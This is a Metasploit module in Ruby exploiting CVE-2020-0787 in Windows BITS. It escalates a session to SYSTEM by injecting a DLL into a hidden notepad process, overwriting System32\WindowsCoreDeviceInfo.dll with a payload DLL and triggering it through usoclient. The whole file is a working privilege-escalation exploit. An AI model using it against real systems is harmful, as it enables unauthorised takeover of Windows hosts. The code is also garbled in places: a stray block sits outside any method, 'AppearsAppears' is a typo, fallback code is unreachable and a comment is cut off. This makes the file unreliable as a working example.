# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability&#039;,
        &#039;Description&#039; => %q{
          This module exploits CVE-2020-0787, an arbitrary file move vulnerability in outdated versions of the
          Background Intelligent Transfer Service (BITS), to overwrite C:\Windows\System32\WindowsCoreDeviceInfo.dll
          with a malicious DLL containing the attacker&#039;s payload.

          To achieve code execution as the SYSTEM user, the Update Session Orchestrator service is then started, which
          will result in the malicious WindowsCoreDeviceInfo.dll being run with SYSTEM privileges due to a DLL hijacking
          issue within the Update Session Orchestrator Service.

          Update Session Orchestrator Service was only introduced in Windows 10. Note that only Windows 10 has been tested,
          so your mileage may vary on Windows Server 2016 and later.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
          [
            &#039;itm4n&#039;, # PoC
            &#039;gwillcox-r7&#039; # msf module
          ],
        &#039;Platform&#039; => [&#039;win&#039;],
        &#039;Privileged&#039; => true,
        &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
        &#039;Targets&#039; =>
          [
            [ &#039;Windows DLL Dropper&#039;, { &#039;Arch&#039; => [ARCH_X86, ARCH_X64], &#039;Type&#039; => :windows_dropper } ],
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;2020-03-10&#039;,
        &#039;References&#039; =>
          [
            [&#039;CVE&#039;, &#039;2020-0787&#039;],
            [&#039;URL&#039;, &#039;https://itm4n.github.io/cve-2020-0787-windows-bits-eop/&#039;],
            [&#039;URL&#039;, &#039;https://github.com/itm4n/BitsArbitraryFileMove&#039;],
            [&#039;URL&#039;, &#039;https://attackerkb.com/assessments/e61cfec0-d766-4e7e-89f7-5aad2460afb8&#039;],
            [&#039;URL&#039;, &#039;https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html&#039;],
            [&#039;URL&#039;, &#039;https://itm4n.github.io/usodllloader-part1/&#039;],
            [&#039;URL&#039;, &#039;https://itm4n.github.io/usodllloader-part2/&#039;],
          ],
        &#039;Notes&#039; =>
          {
            &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK ],
            &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
            &#039;Stability&#039; => [ CRASH_SAFE ]
          },
        &#039;DefaultOptions&#039; =>
          {
            &#039;EXITFUNC&#039; => &#039;thread&#039;,
            &#039;WfsDelay&#039; => 900
          }
      )
    )

    register_options([
      OptBool.new(&#039;OVERWRITE_DLL&#039;, [true, &#039;Overwrite WindowsCoreDeviceInfo.dll if it exists (false by default).&#039;, false]),
      OptInt.new(&#039;JOB_WAIT_TIME&#039;, [true, &#039;Time to wait for the BITS job to complete before starting the USO service to execute the uploaded payload, in seconds&#039;, 20])
    ])
  end

    print_warning(&#039;Attempts to exploit this target with this module WILL NOT WORK!&#039;)
  end

  def check
    sysinfo_value = sysinfo[&#039;OS&#039;]

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return CheckCode::Safe(&#039;Target is not a Windows system, so it is not affected by this vulnerability!&#039;)
    end

    # XXX Using session.shell_command_token over cmd_exec() here as @wvu-r7 noticed cmd_exec() was broken under some situations.
    build_num_raw = session.shell_command_token(&#039;cmd.exe /c ver&#039;)
    build_num = build_num_raw.match(/\d+\.\d+\.\d+\.\d+/)
    if build_num.nil?
      print_error("Couldn&#039;t retrieve the target&#039;s build number!")
    else
      build_num = build_num_raw.match(/\d+\.\d+\.\d+\.\d+/)[0]
      print_status("Target&#039;s build number: #{build_num}")
    end

    # see https://docs.microsoft.com/en-us/windows/release-information/
    unless sysinfo_value =~ /(7|8|8\.1|10|2008|2012|2016|2019|1803|1903)/
      return CheckCode::Safe(&#039;Target is not running a vulnerable version of Windows!&#039;)
    end

    build_num_gemversion = Gem::Version.new(build_num)

    # Build numbers taken from https://www.qualys.com/research/security-alerts/2020-03-10/microsoft/
    if (build_num_gemversion >= Gem::Version.new(&#039;10.0.18363.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.18363.719&#039;)) # Windows 10 v1909
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1909 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.18362.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.18362.719&#039;)) # Windows 10 v1903
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1903 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.17763.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.17763.1098&#039;)) # Windows 10 v1809
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1809 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.17134.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.17134.1365&#039;)) # Windows 10 v1803
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1803 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.16299.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.16299.1747&#039;)) # Windows 10 v1709
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1709 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.15063.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.15063.2313&#039;)) # Windows 10 v1703
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1703 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.14393.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.14393.3564&#039;)) # Windows 10 v1607
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1607 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.10586.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.10586.9999999&#039;)) # Windows 10 v1511
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1511 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;10.0.10240.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;10.0.10240.18519&#039;)) # Windows 10 v1507
      return CheckCode::Appears(&#039;Vulnerable Windows 10 v1507 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;6.3.9600.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;6.3.9600.19665&#039;)) # Windows 8.1/Windows Server 2012 R2
      return CheckCode::Appears(&#039;Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;6.2.9200.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;6.2.9200.23009&#039;)) # Windows 8/Windows Server 2012
      return CheckCode::AppearsAppears(&#039;Vulnerable Windows 8/Windows Server 2012 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;6.1.7600.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;6.1.7601.24549&#039;)) # Windows 7/Windows Server 2008 R2
      return CheckCode::Appears(&#039;Vulnerable Windows 7/Windows Server 2008 R2 build detected!&#039;)
    elsif (build_num_gemversion >= Gem::Version.new(&#039;6.0.6001.0&#039;)) && (build_num_gemversion < Gem::Version.new(&#039;6.0.6003.20749&#039;)) # Windows Server 2008/Windows Server 2008 SP2
      return CheckCode::Appears(&#039;Windows Server 2008/Windows Server 2008 SP2 build detected!&#039;)
    else
      return CheckCode::Safe(&#039;The build number of the target machine does not appear to be a vulnerable version!&#039;)
    end
  end

  def check_target_is_running_supported_windows_version
    if sysinfo[&#039;OS&#039;].match(&#039;Windows&#039;).nil?
      fail_with(Failure::NotVulnerable, &#039;Target is not running Windows!&#039;)
    elsif sysinfo[&#039;OS&#039;].match(&#039;Windows 10&#039;).nil? && sysinfo[&#039;OS&#039;].match(&#039;Windows Server 2016&#039;).nil? && sysinfo[&#039;OS&#039;].match(&#039;Windows Server 2019&#039;).nil?
      fail_with(Failure::BadConfig, &#039;Target is running Windows, its not a version this module supports! Bailing...&#039;)
    end
  end

  def check_target_and_payload_match_and_supported(client_arch)
    if (client_arch != ARCH_X64) && (client_arch != ARCH_X86)
      fail_with(Failure::BadConfig, &#039;This exploit currently only supports x86 and x64 targets!&#039;)
    end
    payload_arch = payload.arch.first # TODO: Add missing documentation for payload.arch, @wvu used this first but it is not documented anywhere.
    if (payload_arch != ARCH_X64) && (payload_arch != ARCH_X86)
      fail_with(Failure::BadConfig, "Unsupported payload architecture (#{payload_arch})") # Unsupported architecture, so return an error.
    end
    if ((client_arch == ARCH_X64) && (payload_arch != ARCH_X64)) || ((client_arch == ARCH_X86) && (payload_arch != ARCH_X86))
      fail_with(Failure::BadConfig, "Payload architecture (#{payload_arch}) doesn&#039;t match the architecture of the target (#{client_arch})!")
    end
  end

  def check_windowscoredeviceinfo_dll_exists_on_target
    # Taken from bwatters-r7&#039;s cve-2020-0688_service_tracing.rb code.
    #
    # We are going to overwrite the WindowsCoreDeviceInfo.dll DLL as part of our exploit.
    # The second part of this exploit will trigger a Update Session to be created so that this DLL
    # is loaded, which will result in arbitrary code execution as SYSTEM.
    #
    # that they want to overwrite the file.
    win_dir = session.sys.config.getenv(&#039;windir&#039;)
    normal_target_payload_pathname = "#{win_dir}\\System32\\WindowsCoreDeviceInfo.dll"
    wow64_target_payload_pathname = "#{win_dir}\\Sysnative\\WindowsCoreDeviceInfo.dll"
    wow64_existing_file = "#{win_dir}\\Sysnative\\win32k.sys"
    if file?(wow64_existing_file)
      if file?(wow64_target_payload_pathname)
        print_warning("#{wow64_target_payload_pathname} already exists")
        print_warning(&#039;If it is in use, the overwrite will fail&#039;)
        unless datastore[&#039;OVERWRITE_DLL&#039;]
          print_error(&#039;Change OVERWRITE_DLL option to true if you would like to proceed.&#039;)
          fail_with(Failure::BadConfig, "#{wow64_target_payload_pathname} already exists and OVERWRITE_DLL option is false")
        end
      end
      target_payload_pathname = wow64_target_payload_pathname
    elsif file?(normal_target_payload_pathname)
      print_warning("#{normal_target_payload_pathname} already exists")
      print_warning(&#039;If it is in use, the overwrite will fail&#039;)
      unless datastore[&#039;OVERWRITE_DLL&#039;]
        print_error(&#039;Change OVERWRITE_DLL option to true if you would like to proceed.&#039;)
        fail_with(Failure::BadConfig, "#{normal_target_payload_pathname} already exists and OVERWRITE_DLL option is false")
      end
      target_payload_pathname = normal_target_payload_pathname
    end
    target_payload_pathname
  end

  def launch_background_injectable_notepad
    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, &#039;Hidden&#039; => true)
    process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{process.pid} launched.")
    process
    # Sandboxes could not allow to create a new process
    # stdapi_sys_process_execute: Operation failed: Access is denied.
    print_error(&#039;Operation failed. Trying to elevate the current process...&#039;)
    process = client.sys.process.open
    process
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    # Step 1: Check target environment is correct.
    print_status(&#039;Step #1: Checking target environment...&#039;)
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
    client_arch = sysinfo[&#039;Architecture&#039;]
    check_target_is_running_supported_windows_version
    check_target_and_payload_match_and_supported(client_arch)
    check_windowscoredeviceinfo_dll_exists_on_target

    # Step 2: Generate the malicious DLL and upload it to a temp location.
    print_status(&#039;Step #2: Generating the malicious DLL...&#039;)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2020-0787&#039;)
    datastore[&#039;EXE::Path&#039;] = path
    if client_arch =~ /x86/i
      datastore[&#039;EXE::Template&#039;] = ::File.join(path, &#039;template_x86_windows.dll&#039;)
      library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2020-0787&#039;, &#039;CVE-2020-0787.x86.dll&#039;)
      library_path = ::File.expand_path(library_path)
    elsif client_arch =~ /x64/i
      datastore[&#039;EXE::Template&#039;] = ::File.join(path, &#039;template_x64_windows.dll&#039;)
      library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2020-0787&#039;, &#039;CVE-2020-0787.x64.dll&#039;)
      library_path = ::File.expand_path(library_path)
    end

    payload_dll = generate_payload_dll
    print_status("Payload DLL is #{payload_dll.length} bytes long")
    temp_directory = session.sys.config.getenv(&#039;%TEMP%&#039;)
    malicious_dll_location = "#{temp_directory}\\" + Rex::Text.rand_text_alpha(6..13) + &#039;.dll&#039;
    write_file(malicious_dll_location, payload_dll)
    register_file_for_cleanup(malicious_dll_location)

    # Step 3: Load the main DLL that will trigger the exploit and conduct the arbitrary file copy.
    print_status(&#039;Step #3: Loading the exploit DLL to run the main exploit...&#039;)
    process = launch_background_injectable_notepad

    print_status("Injecting DLL into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    dll_info_parameter = malicious_dll_location.to_s
    payload_mem = inject_into_process(process, dll_info_parameter)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;DLL injected. Executing injected DLL...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)

    print_status("Sleeping for #{datastore[&#039;JOB_WAIT_TIME&#039;]} seconds to allow the exploit to run...")
    sleep datastore[&#039;JOB_WAIT_TIME&#039;]

    register_file_for_cleanup(&#039;C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll&#039;) # Register this file for cleanup so that if we fail, then the file is cleaned up.
    # Normally we can&#039;t delete this file though as there will be a SYSTEM service that has a handle to this file.

    print_status("Starting the interactive scan job...")
    # Step 4: Execute `usoclient StartInteractiveScan` to trigger the payload
    # XXX Using session.shell_command_token over cmd_exec() here as @wvu-r7 noticed cmd_exec() was broken under some situations.
    session.shell_command_token(&#039;usoclient StartInteractiveScan&#039;)

    print_status("Enjoy the shell!")
  end
end

